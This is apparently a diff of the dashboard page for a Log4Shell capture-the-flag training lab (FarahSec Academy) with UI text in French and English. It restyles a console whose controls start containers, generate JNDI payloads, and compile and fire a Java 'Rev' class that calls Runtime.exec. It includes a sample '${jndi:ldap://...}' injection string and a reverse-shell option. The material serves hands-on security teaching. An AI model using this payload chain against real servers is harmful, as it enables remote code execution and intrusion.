@@ -3,434 +3,145 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard - Log4Shell CTF Lab</title>
+    <title>Mission Control | Log4Shell</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap');
-        
-        :root {
-            --bg-primary: #0a0e27;
-            --bg-secondary: #151932;
-            --bg-card: #1a1f3a;
-            --accent-primary: #00ff88;
-            --accent-secondary: #00d4ff;
-            --accent-danger: #ff3366;
-            --accent-warning: #ffaa00;
-            --text-primary: #e4e4e7;
-            --text-secondary: #a1a1aa;
-            --border-color: #2d3250;
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Inter', sans-serif;
-            background: var(--bg-primary);
-            color: var(--text-primary);
-            min-height: 100vh;
-        }
-        
-        .header {
-            background: var(--bg-secondary);
-            border-bottom: 2px solid var(--border-color);
-            padding: 15px 30px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
-        
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-        
-        .logo h1 {
-            font-size: 1.5em;
-            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        
-        .user-info {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-        }
-        
-        .score-badge {
-            background: linear-gradient(135deg, var(--accent-primary), #00cc70);
-            color: var(--bg-primary);
-            padding: 8px 20px;
-            border-radius: 20px;
-            font-weight: 700;
-            font-size: 1.1em;
-        }
-        
-        .nav-links {
-            display: flex;
-            gap: 15px;
-        }
-        
-        .nav-link {
-            padding: 8px 16px;
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            color: var(--text-primary);
-            text-decoration: none;
-            transition: all 0.3s;
-        }
-        
-        .nav-link:hover {
-            border-color: var(--accent-primary);
-            color: var(--accent-primary);
-        }
-        
-        .container {
-            max-width: 1600px;
-            margin: 30px auto;
-            padding: 0 30px;
-        }
-        
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(12, 1fr);
-            gap: 25px;
-            margin-bottom: 25px;
-        }
-        
-        .card {
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            border-radius: 16px;
-            padding: 25px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
-        }
-        
-        .card-header {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 20px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid var(--border-color);
-        }
-        
-        .card-icon {
-            font-size: 1.5em;
-            color: var(--accent-primary);
-        }
-        
-        .card-title {
-            font-size: 1.3em;
-            font-weight: 600;
-        }
-        
-        .col-4 { grid-column: span 4; }
-        .col-12 { grid-column: span 12; }
-        
-        .btn {
-            padding: 12px 24px;
-            border: none;
-            border-radius: 8px;
-            font-size: 1em;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            text-transform: uppercase;
-        }
-        
-        .btn-primary {
-            background: linear-gradient(135deg, var(--accent-primary), #00cc70);
-            color: var(--bg-primary);
-        }
-        
-        .btn-danger {
-            background: linear-gradient(135deg, var(--accent-danger), #cc0044);
-            color: white;
-        }
-        
-        .btn-secondary {
-            background: var(--bg-secondary);
-            color: var(--text-primary);
-            border: 1px solid var(--border-color);
-        }
-        
-        .btn-warning {
-            background: linear-gradient(135deg, var(--accent-warning), #ff8800);
-            color: var(--bg-primary);
-        }
-        
-        .btn-block {
-            width: 100%;
-            justify-content: center;
-            margin-top: 10px;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-label {
-            display: block;
-            margin-bottom: 8px;
-            color: var(--text-secondary);
-            font-size: 0.9em;
-            font-weight: 600;
-            text-transform: uppercase;
-        }
-        
-        .form-control {
-            width: 100%;
-            padding: 12px 16px;
-            background: var(--bg-secondary);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            color: var(--text-primary);
-            font-size: 1em;
-            font-family: 'Fira Code', monospace;
-        }
-        
-        .form-control:focus {
-            outline: none;
-            border-color: var(--accent-primary);
-        }
-        
-        textarea.form-control {
-            min-height: 200px;
-            resize: vertical;
-        }
-        
-        .status-list {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-        
-        .status-item {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 15px;
-            background: var(--bg-secondary);
-            border-radius: 8px;
-            border-left: 3px solid var(--accent-primary);
-        }
-        
-        .status-info {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        
-        .status-dot {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            animation: blink 2s infinite;
-        }
-        
-        .status-dot.online {
-            background: var(--accent-primary);
-            box-shadow: 0 0 10px var(--accent-primary);
-        }
-        
-        .status-dot.offline {
-            background: var(--accent-danger);
-        }
-        
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-        
-        .badge {
-            padding: 6px 12px;
-            border-radius: 6px;
-            font-size: 0.85em;
-            font-weight: 600;
-            font-family: 'Fira Code', monospace;
-        }
-        
-        .badge-success {
-            background: rgba(0, 255, 136, 0.2);
-            color: var(--accent-primary);
-            border: 1px solid var(--accent-primary);
-        }
-        
-        .badge-danger {
-            background: rgba(255, 51, 102, 0.2);
-            color: var(--accent-danger);
-            border: 1px solid var(--accent-danger);
-        }
-        
-        .terminal {
-            background: #000;
-            border-radius: 8px;
-            padding: 20px;
-            font-family: 'Fira Code', monospace;
-            font-size: 0.9em;
-            max-height: 400px;
-            overflow-y: auto;
-        }
-        
-        .terminal-line {
-            margin-bottom: 8px;
-            padding: 8px;
-            border-left: 2px solid var(--accent-primary);
-            background: rgba(0, 255, 136, 0.03);
-            border-radius: 4px;
-        }
-        
-        .terminal-time {
-            color: var(--accent-secondary);
-            font-weight: 700;
-        }
-        
-        .terminal-text {
-            color: var(--accent-primary);
-        }
-        
-        .payload-display {
-            background: var(--bg-secondary);
-            border: 1px solid var(--accent-primary);
-            border-radius: 8px;
-            padding: 15px;
-            margin: 15px 0;
-            font-family: 'Fira Code', monospace;
-            word-break: break-all;
-        }
-        
-        .alert {
-            padding: 15px 20px;
-            border-radius: 8px;
-            margin: 15px 0;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        
-        .alert-success {
-            background: rgba(0, 255, 136, 0.1);
-            border-left: 4px solid var(--accent-primary);
-            color: var(--accent-primary);
-        }
-        
-        .alert-error {
-            background: rgba(255, 51, 102, 0.1);
-            border-left: 4px solid var(--accent-danger);
-            color: var(--accent-danger);
-        }
-        
-        @media (max-width: 1200px) {
-            .col-4 { grid-column: span 12; }
-        }
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700;800&display=swap');
+        :root{--bg:#0B0F14;--panel:#121923;--panel2:#0F1A2B;--border:#223247;--red:#D41414;--red2:#FF2A2A;--blue:#1F6AFF;--glow:#00C2FF;--text:#F2F4F8;--muted:#8A8F98;--ok:#18b26b;--bad:#ff5d73}
+        *{box-sizing:border-box;margin:0;padding:0} body{font-family:Inter,sans-serif;background:radial-gradient(circle at top left,rgba(31,106,255,.09),transparent 25%),radial-gradient(circle at bottom right,rgba(212,20,20,.12),transparent 30%),var(--bg);color:var(--text)}
+        .top{position:sticky;top:0;z-index:5;display:flex;justify-content:space-between;gap:12px;align-items:center;padding:18px 24px;background:rgba(15,26,43,.9);backdrop-filter:blur(10px);border-bottom:1px solid rgba(0,194,255,.12)}
+        .brand{display:flex;align-items:center;gap:14px}.mark{width:44px;height:44px;border-radius:14px;display:grid;place-items:center;background:linear-gradient(135deg,var(--red),var(--red2));box-shadow:0 10px 24px rgba(212,20,20,.25)}
+        .brand h1{font-size:1.05rem}.brand p,.muted{color:var(--muted)}
+        .actions{display:flex;gap:10px;flex-wrap:wrap;justify-content:flex-end}
+        .chip,.nav{display:inline-flex;align-items:center;gap:8px;padding:10px 13px;border-radius:999px;border:1px solid var(--border);background:rgba(18,25,35,.9);font:600 .8rem 'Fira Code',monospace;color:var(--text);text-decoration:none}
+        .chip{color:var(--glow);border-color:rgba(0,194,255,.2)} .nav{border-radius:14px;font-family:Inter,sans-serif}.nav:hover{color:var(--blue);transform:translateY(-1px)}
+        .wrap{display:grid;grid-template-columns:300px 1fr;gap:20px;padding:24px}
+        .card,.side{background:rgba(18,25,35,.93);border:1px solid var(--border);border-radius:22px;box-shadow:0 18px 40px rgba(0,0,0,.22)}
+        .side{padding:18px;height:max-content;position:sticky;top:92px}.side h3,.section h3{font:600 .8rem 'Fira Code',monospace;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;margin-bottom:12px}
+        .stack{display:grid;gap:10px}.mini,.item,.console-line,.status{background:rgba(12,20,31,.92);border:1px solid rgba(255,255,255,.04);border-radius:16px;padding:14px}
+        .mini strong,.item strong{display:block;margin-bottom:6px}.mini code{color:var(--glow);font-family:'Fira Code',monospace}
+        .hero{padding:24px;overflow:hidden;position:relative}.hero:after{content:"";position:absolute;inset:0;background:linear-gradient(transparent 95%,rgba(0,194,255,.04) 100%),linear-gradient(90deg,transparent 95%,rgba(0,194,255,.04) 100%);background-size:20px 20px;opacity:.35;pointer-events:none}
+        .hero > *{position:relative;z-index:1}.eyebrow{display:inline-flex;align-items:center;gap:8px;padding:8px 12px;border-radius:999px;background:rgba(0,194,255,.08);border:1px solid rgba(0,194,255,.2);color:var(--glow);font:600 .75rem 'Fira Code',monospace;text-transform:uppercase;letter-spacing:.08em}
+        .hero h2{font-size:clamp(2rem,4vw,3.2rem);line-height:1;letter-spacing:-.05em;margin-top:16px}.hero h2 span{color:var(--glow)} .hero p{max-width:760px;margin-top:14px;color:var(--muted);line-height:1.8}
+        .stats,.grid2,.tools{display:grid;gap:16px}.stats{grid-template-columns:repeat(3,1fr);margin-top:20px}.grid2,.tools{grid-template-columns:repeat(2,1fr)} .stat{padding:18px}.stat small{display:block;color:var(--muted);font:600 .74rem 'Fira Code',monospace;text-transform:uppercase;margin-bottom:8px}.stat strong{font-size:1.7rem}
+        .section{padding:20px}.section p{color:var(--muted);line-height:1.75;font-size:.95rem}
+        .tasks{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}.item small{display:inline-flex;gap:8px;color:var(--blue);font:600 .74rem 'Fira Code',monospace;text-transform:uppercase}.item h4{margin:10px 0 8px}
+        .field{margin-bottom:12px}.field label{display:block;margin-bottom:6px;color:var(--muted);font:600 .74rem 'Fira Code',monospace;text-transform:uppercase}
+        .field input,.field select,.field textarea{width:100%;padding:13px 14px;border-radius:14px;border:1px solid var(--border);background:#0E1621;color:var(--text);font:500 .92rem 'Fira Code',monospace}
+        .field textarea{min-height:150px;resize:vertical}.field input:focus,.field select:focus,.field textarea:focus{outline:none;border-color:var(--glow);box-shadow:0 0 0 4px rgba(0,194,255,.12)}
+        .btns{display:flex;gap:10px;flex-wrap:wrap}.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:12px 14px;border-radius:14px;border:none;cursor:pointer;font-weight:700}
+        .btn:hover{transform:translateY(-1px)} .primary{background:linear-gradient(135deg,var(--red),var(--red2));color:var(--text)} .secondary{background:rgba(15,26,43,.95);border:1px solid var(--border);color:var(--text)} .danger{background:linear-gradient(135deg,#6b1111,var(--red));color:var(--text)} .ghost{background:rgba(0,194,255,.08);border:1px solid rgba(0,194,255,.18);color:var(--glow)} .full{width:100%}
+        .payload,.result{margin-top:14px;padding:14px 16px;border-radius:16px;font:500 .86rem 'Fira Code',monospace;word-break:break-word}.payload{background:#060a10;border:1px solid rgba(0,194,255,.12)} .ok{background:rgba(24,178,107,.08);border:1px solid rgba(24,178,107,.28);color:#9ae5c0} .err{background:rgba(255,93,115,.08);border:1px solid rgba(255,93,115,.25);color:#ff9aaa}
+        .status{border-left:3px solid var(--glow)} .status small{display:block;margin-top:6px;color:var(--muted)} .badge{display:inline-flex;align-items:center;gap:8px;padding:8px 12px;border-radius:999px;font:600 .74rem 'Fira Code',monospace;text-transform:uppercase}.online{color:var(--ok);background:rgba(24,178,107,.1);border:1px solid rgba(24,178,107,.2)} .offline{color:var(--bad);background:rgba(255,93,115,.1);border:1px solid rgba(255,93,115,.2)}
+        .console{overflow:hidden}.console-top{display:flex;justify-content:space-between;align-items:center;padding:14px 16px;border-bottom:1px solid var(--border);background:#0E1621;font:500 .78rem 'Fira Code',monospace;color:var(--muted)} .console-body{max-height:360px;overflow:auto;padding:16px}.console-line{border-left:3px solid var(--glow)} .console-line+.console-line{margin-top:10px}.time{color:var(--glow);margin-right:8px}
+        @media (max-width:1200px){.wrap{grid-template-columns:1fr}.side{position:static}.grid2,.tools,.tasks{grid-template-columns:1fr}.stats{grid-template-columns:1fr}}
+        @media (max-width:720px){.top,.wrap{padding:16px}}
     </style>
 </head>
 <body>
-    <header class="header">
-        <div class="logo">
-            <div style="font-size: 2em;">🔥</div>
-            <h1>Log4Shell CTF Lab</h1>
+    <header class="top">
+        <div class="brand">
+            <div class="mark"><i class="fas fa-skull-crossbones"></i></div>
+            <div>
+                <h1>FarahSec Academy</h1>
+                <p>Mission Log4Shell | Student console</p>
+            </div>
         </div>
-        <div class="user-info">
-            <div class="score-badge">
-                <i class="fas fa-trophy"></i> Score: <span id="user-score">0</span>
-            </div>
-            <div class="nav-links">
-                <a href="/quiz" class="nav-link"><i class="fas fa-brain"></i> Quiz</a>
-                <a href="/learn" class="nav-link"><i class="fas fa-book"></i> Learn</a>
-                <a href="/logout" class="nav-link"><i class="fas fa-sign-out-alt"></i> Logout</a>
-            </div>
+        <div class="actions">
+            <div class="chip"><i class="fas fa-bolt"></i> Score <span id="user-score">0</span></div>
+            <a class="nav" href="/learn"><i class="fas fa-book-open"></i> Theory</a>
+            <a class="nav" href="/quiz"><i class="fas fa-brain"></i> Validation</a>
+            <a class="nav" href="/logout"><i class="fas fa-right-from-bracket"></i> Logout</a>
         </div>
     </header>
-    
-    <div class="container">
-        <div class="grid">
-            <div class="card col-4">
-                <div class="card-header">
-                    <i class="fas fa-server card-icon"></i>
-                    <h2 class="card-title">Infrastructure</h2>
+    <main class="wrap">
+        <aside class="side">
+            <div class="stack">
+                <div>
+                    <h3>Target Profile</h3>
+                    <div class="mini"><strong>Spring Target</strong><code>{{ runtime.target }}</code></div>
                 </div>
-                <div class="status-list" id="container-status"></div>
-                <button class="btn btn-primary btn-block" onclick="startContainers()">
-                    <i class="fas fa-play"></i> Start Lab
-                </button>
-                <button class="btn btn-danger btn-block" onclick="stopContainers()">
-                    <i class="fas fa-stop"></i> Stop Lab
-                </button>
-                <button class="btn btn-secondary btn-block" onclick="checkStatus()">
-                    <i class="fas fa-sync"></i> Refresh
-                </button>
+                <div>
+                    <h3>Relay Services</h3>
+                    <div class="mini"><strong>LDAP</strong><code>{{ runtime.ldap_host }}:{{ runtime.ldap_port }}</code></div>
+                    <div class="mini" style="margin-top:10px;"><strong>HTTP Payload</strong><code>attacker-webserver:{{ runtime.attacker_http_port }}</code></div>
+                </div>
+                <div>
+                    <h3>Mission Path</h3>
+                    <div class="item"><strong>1. Boot</strong><p>Démarrer le lab et lire l’état des services.</p></div>
+                    <div class="item"><strong>2. Forge</strong><p>Préparer un payload JNDI et le code Java associé.</p></div>
+                    <div class="item"><strong>3. Fire</strong><p>Injecter le header malveillant puis analyser le résultat.</p></div>
+                    <div class="item"><strong>4. Validate</strong><p>Consolider avec la théorie et le quiz final.</p></div>
+                </div>
             </div>
-            
-            <div class="card col-4">
-                <div class="card-header">
-                    <i class="fas fa-bolt card-icon"></i>
-                    <h2 class="card-title">Payload Generator</h2>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Attacker IP</label>
-                    <input type="text" class="form-control" id="attacker-ip" value="192.168.126.131">
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Port</label>
-                    <input type="number" class="form-control" id="port" value="4444">
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Type</label>
-                    <select class="form-control" id="payload-type">
-                        <option value="simple">Simple Test</option>
-                        <option value="reverse_shell">Reverse Shell</option>
-                    </select>
-                </div>
-                <button class="btn btn-primary btn-block" onclick="generatePayload()">
-                    <i class="fas fa-code"></i> Generate
-                </button>
-                <div id="generated-payload"></div>
-            </div>
-            
-            <div class="card col-4">
-                <div class="card-header">
-                    <i class="fas fa-rocket card-icon"></i>
-                    <h2 class="card-title">Attack Control</h2>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Target</label>
-                    <input type="text" class="form-control" id="target" value="192.168.126.131:8080">
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Payload</label>
-                    <input type="text" class="form-control" id="attack-payload" value="${jndi:ldap://192.168.126.131:1389/Rev}">
-                </div>
-                <button class="btn btn-warning btn-block" onclick="startWebServer()">
-                    <i class="fas fa-globe"></i> Start Web Server
-                </button>
-                <button class="btn btn-danger btn-block" onclick="launchAttack()">
-                    <i class="fas fa-crosshairs"></i> Launch Attack
-                </button>
-                <div id="attack-result"></div>
-            </div>
-        </div>
-        
-        <div class="grid">
-            <div class="card col-12">
-                <div class="card-header">
-                    <i class="fas fa-code card-icon"></i>
-                    <h2 class="card-title">Custom Payload Editor</h2>
-                </div>
-                <textarea class="form-control" id="java-code">public class Rev {
+        </aside>
+        <section class="stack">
+            <section class="card hero">
+                <div class="eyebrow"><i class="fas fa-terminal"></i> Active Mission</div>
+                <h2>Play the attack.<br><span>Understand the exploit.</span></h2>
+                <p>Cette interface est pensée comme une salle de mission offensive inspirée des plateformes de lab: tu observes la cible, fabriques le payload, attaques, puis relies chaque action à la chaîne d’exploitation Log4Shell.</p>
+            </section>
+
+            <section class="stats">
+                <article class="card stat"><small>Mission Score</small><strong id="mission-score">0</strong><p class="muted">Points cumulés pendant le parcours.</p></article>
+                <article class="card stat"><small>Attack Count</small><strong id="attack-count">0</strong><p class="muted">Tentatives d’exploitation envoyées.</p></article>
+                <article class="card stat"><small>Quiz Progress</small><strong id="quiz-score">0</strong><p class="muted">Score théorique actuel.</p></article>
+            </section>
+
+            <section class="tasks">
+                <article class="card item"><small><i class="fas fa-1"></i> Boot</small><h4>Bring the lab online</h4><p>Vérifie l’état du terrain de jeu et démarre les services.</p></article>
+                <article class="card item"><small><i class="fas fa-2"></i> Craft</small><h4>Forge the payload</h4><p>Prépare une charge JNDI réaliste pour la cible.</p></article>
+                <article class="card item"><small><i class="fas fa-3"></i> Fire</small><h4>Launch the exploit</h4><p>Envoie le header malveillant et observe la réaction.</p></article>
+            </section>
+
+            <section class="grid2">
+                <section class="card section">
+                    <div style="display:flex;justify-content:space-between;gap:12px;align-items:center;margin-bottom:14px">
+                        <div><h3>Infrastructure Monitor</h3><p class="muted">Retour des services du lab-manager.</p></div>
+                        <div id="infra-badge" class="badge offline"><i class="fas fa-plug-circle-xmark"></i> offline</div>
+                    </div>
+                    <div id="container-status" class="stack"><div class="status">Aucun statut disponible.</div></div>
+                    <div class="btns" style="margin-top:14px">
+                        <button class="btn primary" onclick="startContainers()"><i class="fas fa-play"></i> Start Lab</button>
+                        <button class="btn secondary" onclick="checkStatus()"><i class="fas fa-arrows-rotate"></i> Refresh</button>
+                        <button class="btn danger" onclick="stopContainers()"><i class="fas fa-stop"></i> Stop</button>
+                    </div>
+                </section>
+                <section class="card section">
+                    <h3>Mission Tips</h3>
+                    <div class="item"><strong>Inject LDAP, not HTTP</strong><p>Le payload JNDI pointe d’abord vers le serveur LDAP.</p></div>
+                    <div class="item"><strong>Observe the chain</strong><p>LDAP renvoie ensuite la référence vers la classe servie en HTTP.</p></div>
+                    <div class="item"><strong>Standalone caveat</strong><p>Sans Docker ou lab-manager, l’UI reste utile mais l’attaque peut échouer.</p></div>
+                </section>
+            </section>
+
+            <section class="tools">
+                <section class="card section">
+                    <h3>Payload Forge</h3>
+                    <p>Prépare un payload JNDI et injecte-le ensuite dans le lanceur d’attaque.</p>
+                    <div class="field"><label for="attacker-ip">LDAP Host</label><input id="attacker-ip" value="{{ runtime.ldap_host }}"></div>
+                    <div class="field"><label for="port">LDAP Port</label><input id="port" type="number" value="{{ runtime.ldap_port }}"></div>
+                    <div class="field"><label for="payload-type">Payload Type</label><select id="payload-type"><option value="simple">Exploit.class</option><option value="reverse_shell">Rev.class</option></select></div>
+                    <button class="btn primary full" onclick="generatePayload()"><i class="fas fa-bolt"></i> Generate payload</button>
+                    <div id="generated-payload"></div>
+                </section>
+                <section class="card section">
+                    <h3>Attack Launcher</h3>
+                    <p>Définis la cible et envoie le header vulnérable depuis le panneau de mission.</p>
+                    <div class="field"><label for="target">Target URL or host:port</label><input id="target" value="{{ runtime.target }}"></div>
+                    <div class="field"><label for="attack-payload">Injected Header Value</label><input id="attack-payload" value="{{ runtime.payload }}"></div>
+                    <div class="btns">
+                        <button class="btn ghost" onclick="startWebServer()"><i class="fas fa-server"></i> Check web server</button>
+                        <button class="btn danger" onclick="launchAttack()"><i class="fas fa-paper-plane"></i> Launch attack</button>
+                    </div>
+                    <div id="attack-result"></div>
+                </section>
+            </section>
+
+            <section class="card section">
+                <h3>Custom Java Payload</h3>
+                <p>Modifie le code Java de démonstration et compile-le directement depuis l’interface.</p>
+                <div class="field"><label for="java-code">Rev.java</label><textarea id="java-code">public class Rev {
     public Rev() {}
     static {
         try {
@@ -438,177 +149,36 @@
             Runtime.getRuntime().exec(cmds);
         } catch (Exception e) {}
     }
-}</textarea>
-                <button class="btn btn-primary" onclick="compilePayload()">
-                    <i class="fas fa-hammer"></i> Compile
-                </button>
+}</textarea></div>
+                <div class="btns"><button class="btn primary" onclick="compilePayload()"><i class="fas fa-hammer"></i> Compile payload</button></div>
                 <div id="compile-result"></div>
-            </div>
-        </div>
-        
-        <div class="grid">
-            <div class="card col-12">
-                <div class="card-header">
-                    <i class="fas fa-terminal card-icon"></i>
-                    <h2 class="card-title">Attack Log</h2>
+            </section>
+
+            <section class="card console">
+                <div class="console-top">
+                    <span>mission://activity-feed</span>
+                    <button class="btn secondary" onclick="refreshLog()"><i class="fas fa-rotate"></i> Refresh</button>
                 </div>
-                <button class="btn btn-secondary" onclick="refreshLog()">
-                    <i class="fas fa-sync"></i> Refresh
-                </button>
-                <div class="terminal" id="attack-log">
-                    <div class="terminal-line">
-                        <span class="terminal-time">[00:00:00]</span>
-                        <span class="terminal-text"> Waiting for attacks...</span>
-                    </div>
+                <div class="console-body" id="attack-log">
+                    <div class="console-line"><span class="time">[IDLE]</span><span>Mission console ready. Waiting for actions.</span></div>
                 </div>
-            </div>
-        </div>
-    </div>
-    
+            </section>
+        </section>
+    </main>
     <script>
-        window.onload = function() {
-            checkStatus();
-            updateScore();
-            setInterval(refreshLog, 5000);
-            setInterval(updateScore, 3000);
-        };
-        
-        function updateScore() {
-            fetch('/api/user/score')
-                .then(r => r.json())
-                .then(data => {
-                    if (data.status === 'success') {
-                        document.getElementById('user-score').textContent = data.score || 0;
-                    }
-                })
-                .catch(error => {
-                    console.error('Fetch error:', error);
-                    document.getElementById('user-score').textContent = '0';
-                });
-        }
-        
-        function checkStatus() {
-            fetch('/api/status')
-                .then(r => r.json())
-                .then(data => {
-                    const container = document.getElementById('container-status');
-                    if (data.status === 'success' && data.containers.length > 0) {
-                        container.innerHTML = data.containers.map(c => `
-                            <div class="status-item">
-                                <div class="status-info">
-                                    <div class="status-dot ${c.status.includes('Up') ? 'online' : 'offline'}"></div>
-                                    <span>${c.name}</span>
-                                </div>
-                                <span class="badge ${c.status.includes('Up') ? 'badge-success' : 'badge-danger'}">
-                                    ${c.status.includes('Up') ? 'ONLINE' : 'OFFLINE'}
-                                </span>
-                            </div>
-                        `).join('');
-                    }
-                });
-        }
-        
-        function startContainers() {
-            fetch('/api/start-containers', {method: 'POST'})
-                .then(r => r.json())
-                .then(data => {
-                    alert(data.message);
-                    setTimeout(checkStatus, 3000);
-                    updateScore();
-                });
-        }
-        
-        function stopContainers() {
-            fetch('/api/stop-containers', {method: 'POST'})
-                .then(r => r.json())
-                .then(data => {
-                    alert(data.message);
-                    checkStatus();
-                });
-        }
-        
-        function generatePayload() {
-            const ip = document.getElementById('attacker-ip').value;
-            const port = document.getElementById('port').value;
-            const type = document.getElementById('payload-type').value;
-            
-            fetch('/api/generate-payload', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ip, port, type})
-            })
-            .then(r => r.json())
-            .then(data => {
-                document.getElementById('generated-payload').innerHTML = `
-                    <div class="payload-display">${data.payload}</div>
-                `;
-                document.getElementById('attack-payload').value = data.payload;
-            });
-        }
-        
-        function startWebServer() {
-            fetch('/api/start-webserver', {method: 'POST'})
-                .then(r => r.json())
-                .then(data => alert(data.message));
-        }
-        
-        function launchAttack() {
-            const target = document.getElementById('target').value;
-            const payload = document.getElementById('attack-payload').value;
-            
-            fetch('/api/launch-attack', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({target, payload})
-            })
-            .then(r => r.json())
-            .then(data => {
-                const result = document.getElementById('attack-result');
-                if (data.status === 'success') {
-                    result.innerHTML = `<div class="alert alert-success">${data.message}</div>`;
-                    updateScore();
-                } else {
-                    result.innerHTML = `<div class="alert alert-error">${data.message}</div>`;
-                }
-                refreshLog();
-            });
-        }
-        
-        function compilePayload() {
-            const code = document.getElementById('java-code').value;
-            
-            fetch('/api/compile-payload', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({code})
-            })
-            .then(r => r.json())
-            .then(data => {
-                const result = document.getElementById('compile-result');
-                if (data.status === 'success') {
-                    result.innerHTML = `<div class="alert alert-success">${data.message}</div>`;
-                    updateScore();
-                } else {
-                    result.innerHTML = `<div class="alert alert-error">${data.message}</div>`;
-                }
-            });
-        }
-        
-        function refreshLog() {
-            fetch('/api/attack-log')
-                .then(r => r.json())
-                .then(data => {
-                    const log = document.getElementById('attack-log');
-                    if (data.log && data.log.length > 0) {
-                        log.innerHTML = data.log.slice().reverse().map(entry => `
-                            <div class="terminal-line">
-                                <span class="terminal-time">[${entry.time}]</span>
-                                <span class="terminal-text"> ${entry.user} → ${entry.target}</span>
-                            </div>
-                        `).join('');
-                    }
-                });
-        }
+        window.onload=function(){updateScore();checkStatus();refreshLog();setInterval(updateScore,3000);setInterval(refreshLog,5000);}
+        function setResult(id,message,ok=true){document.getElementById(id).innerHTML=`<div class="result ${ok?'ok':'err'}">${message}</div>`}
+        function updateScore(){fetch('/api/user/score').then(r=>r.json()).then(data=>{if(data.status!=='success')return;document.getElementById('user-score').textContent=data.score||0;document.getElementById('mission-score').textContent=data.score||0;document.getElementById('attack-count').textContent=data.attacks||0;document.getElementById('quiz-score').textContent=data.quiz_score||0;}).catch(()=>{})}
+        function normalizeContainers(payload){if(Array.isArray(payload?.containers))return payload.containers;if(Array.isArray(payload?.lab?.containers))return payload.lab.containers;if(Array.isArray(payload?.lab?.services))return payload.lab.services;return[]}
+        function renderStatusError(message){document.getElementById('container-status').innerHTML=`<div class="status">${message}</div>`;document.getElementById('infra-badge').className='badge offline';document.getElementById('infra-badge').innerHTML='<i class="fas fa-plug-circle-xmark"></i> offline'}
+        function checkStatus(){fetch('/api/status').then(r=>r.json()).then(data=>{if(data.status!=='success'){renderStatusError(data.message||'Status unavailable.');return;}const containers=normalizeContainers(data);if(!containers.length){renderStatusError('No container data returned by the lab manager.');return;}const online=containers.some(i=>String(i.status||'').toLowerCase().includes('up'));const badge=document.getElementById('infra-badge');badge.className=`badge ${online?'online':'offline'}`;badge.innerHTML=online?'<i class="fas fa-circle-check"></i> online':'<i class="fas fa-circle-xmark"></i> offline';document.getElementById('container-status').innerHTML=containers.map(item=>`<div class="status"><strong>${item.name||item.service||'service'}</strong><small>${item.status||'unknown status'}</small></div>`).join('');}).catch(()=>renderStatusError('Lab manager unreachable from this interface.'))}
+        function startContainers(){fetch('/api/start-containers',{method:'POST'}).then(r=>r.json()).then(data=>{setResult('attack-result',data.message||'Lab start requested.',data.status==='success');setTimeout(checkStatus,1800);updateScore();}).catch(()=>setResult('attack-result','Unable to start lab.',false))}
+        function stopContainers(){fetch('/api/stop-containers',{method:'POST'}).then(r=>r.json()).then(data=>{setResult('attack-result',data.message||'Lab stop requested.',data.status==='success');setTimeout(checkStatus,1400);}).catch(()=>setResult('attack-result','Unable to stop lab.',false))}
+        function generatePayload(){const host=document.getElementById('attacker-ip').value;const port=document.getElementById('port').value;const type=document.getElementById('payload-type').value;fetch('/api/generate-payload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({host,ldap_port:port,type})}).then(r=>r.json()).then(data=>{if(data.status!=='success'){document.getElementById('generated-payload').innerHTML='<div class="result err">Payload generation failed.</div>';return;}document.getElementById('generated-payload').innerHTML=`<div class="payload">${data.payload}</div>`;document.getElementById('attack-payload').value=data.payload;}).catch(()=>document.getElementById('generated-payload').innerHTML='<div class="result err">Payload generation failed.</div>')}
+        function startWebServer(){fetch('/api/start-webserver',{method:'POST'}).then(r=>r.json()).then(data=>setResult('attack-result',data.message||'HTTP server status checked.',data.status==='success')).catch(()=>setResult('attack-result','Unable to verify web server.',false))}
